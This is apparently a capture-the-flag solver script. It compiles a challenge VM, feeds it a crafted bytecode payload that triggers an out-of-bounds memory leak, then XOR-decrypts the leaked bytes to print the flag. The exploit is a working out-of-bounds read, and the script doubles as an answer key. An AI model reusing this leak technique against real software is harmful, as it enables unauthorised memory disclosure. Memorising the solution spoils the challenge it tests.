#!/usr/bin/env python3
from pathlib import Path
import json, math, hashlib, struct, re, sys
HERE = Path(__file__).resolve().parent
CHALLENGE = HERE.parent / "challenge"
def artifact(name):
    p = CHALLENGE / name
    return p if p.exists() else HERE / "unlocked" / name
def load(name):
    return json.loads(artifact(name).read_text())
def flag_bytes(n):
    return n.to_bytes(max(1,(n.bit_length()+7)//8), "big")
def emit(value):
    if isinstance(value,bytes): value=value.decode()
    if not re.fullmatch(r"zerosecurectf\{[^}]+\}",value):
        raise RuntimeError("recovered value is not a flag: " + repr(value))
    print(value)


import tempfile,subprocess
with tempfile.TemporaryDirectory() as td:
    td=Path(td);exe=td/"checker";payload=td/"leak.bin"
    subprocess.run(["gcc","-O2","-o",str(exe),str(artifact("vm.c"))],check=True)
    payload.write_bytes(b"\x01"+struct.pack("<H",0)+b"\x01"+struct.pack("<H",512)+b"\x10\x20\x00")
    reply=subprocess.check_output([str(exe),str(payload),str(artifact("vault.bin"))])
    leaked=bytes.fromhex(reply.decode().split("LEAK ",1)[1].splitlines()[0])[256:]
assert leaked[0]==0x5a
pos=2;parts=[]
for _ in range(leaked[1]):
    index,length=leaked[pos:pos+2];pos+=2
    parts.append((index,leaked[pos:pos+length]));pos+=length
assert leaked[pos:pos+2]==b"\xde\xad";pos+=2
key=leaked[pos:];offset=0;plain={}
for index,ct in parts:
    plain[index]=bytes(a^b for a,b in zip(ct,key[offset:offset+len(ct)]));offset+=len(ct)
emit(b"".join(plain[k] for k in sorted(plain)))
